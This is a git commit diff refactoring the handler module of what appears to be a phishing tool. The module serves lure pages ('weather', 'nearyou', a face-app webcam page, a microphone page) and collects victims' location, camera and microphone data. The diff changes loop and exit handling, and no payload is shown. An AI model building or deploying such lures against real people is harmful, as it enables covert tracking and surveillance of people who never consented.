07a73f5f67ba2a368a98f51cedf19aa8ab4dcda4
VCH <92458450+Inshanecr@users.noreply.github.com>
2022-06-17 19:46:55 +0430

    Update handler.py

--- module/handler.py
+++ module/handler.py
@@ -1,62 +1,57 @@
 from module import localhost,banner
 from module.paths import *
 from module.colors import c
+from module.control import kill_process
 
-
-
-def normal_data():
-       localhost.run_php_server(port=localhost.randPort,dir_name="normal_data")
-       banner.terminal_logo("NormalData")
-       while True:
-        localhost.After_click(dir_path=normal_temp("info"),message="loc")
-        back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
-        if back_menu.lower() == "y":
-            break
-       localhost.kill()
-       
-       
+#Function For Weather Template     
 def weather_info():
     localhost.run_php_server(port=localhost.randPort,dir_name="weather")
     banner.terminal_logo("Weather")
     while True:
-      localhost.After_click(dir_path=weather_temp("info"),message="loc")
-      localhost.Before_click(template=weather_temp("result"),before_click_focus="location")
-      back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
-      if back_menu.lower() == "y":
-            break
-    localhost.kill()
+      localhost.After_click(Ac_path=weather_temp("info"),Ac_msg="loc")
+      exit_Before_click = localhost.Before_click(Bc_template=weather_temp("result"),Bc_focus="location")  
+      exit_error = localhost.error_handler(weather_temp("error"))
+      if exit_Before_click == "Exit" or exit_error == "Exit":
+         break
+      elif exit_Before_click == "continue" or exit_error == "continue":
+        continue
+    kill_process()
 
-
+#Function For NearYou Template     
 def nearyou_info():
     localhost.run_php_server(port=localhost.randPort,dir_name="nearyou")
     banner.terminal_logo("NearYou")
     while True:
-     localhost.After_click(dir_path=nearyou_temp("info"),message="loc")
-     localhost.Before_click(template=nearyou_temp("result"),before_click_focus="location")
-     back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
-     if back_menu.lower() == "y":
-            break      
-    localhost.kill()
+     localhost.After_click(Ac_path=nearyou_temp("info"),Ac_msg="loc")
+     exit_Before_click= localhost.Before_click(Bc_template=nearyou_temp("result"),Bc_focus="location")
+     if exit_Before_click == "Exit":
+         break
+     elif exit_Before_click == "continue":
+        continue
+    kill_process()
  
-  
+#Function For CameraAcess Template     
 def WebCamInfo():
     localhost.run_php_server(port=localhost.randPort,dir_name="camera_temp")
     banner.terminal_logo("WebCam")
     while True:
-     localhost.After_click(dir_path=webcam_temp("face-app-info"),message="webcam")
-     localhost.Before_click(template=webcam_temp("face-app-result"),before_click_focus="webcam")
-     back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
-     if back_menu.lower() == "y":
-            break 
-    localhost.kill()
+     localhost.After_click(Ac_path=webcam_temp("face-app-info"),Ac_msg="webcam")
+     exit_Before_click = localhost.Before_click(Bc_template=webcam_temp("face-app-result"),Bc_focus="webcam")
+     if exit_Before_click == "Exit":
+       break
+     elif exit_Before_click == "continue":
+        continue
+    kill_process()
     
+#Function For Microphone AcessTemplate     
 def MicrophoneInfo():
     localhost.run_php_server(port=localhost.randPort,dir_name="microphone")
     banner.terminal_logo("Microphone")
     while True:
-     localhost.After_click(dir_path=microphone_temp("microphone-info"),message="mic") 
-     localhost.Before_click(template=microphone_temp("microphone-result"),before_click_focus="microphone")
-     back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
-     if back_menu.lower() == "y":
-            break        
-    localhost.kill()
+     localhost.After_click(Ac_path=microphone_temp("microphone-info"),Ac_msg="mic") 
+     exit_Before_click = localhost.Before_click(Bc_template=microphone_temp("microphone-result"),Bc_focus="microphone")
+     if exit_Before_click == "Exit":
+       break
+     elif exit_Before_click == "continue":
+        continue   
+    kill_process()
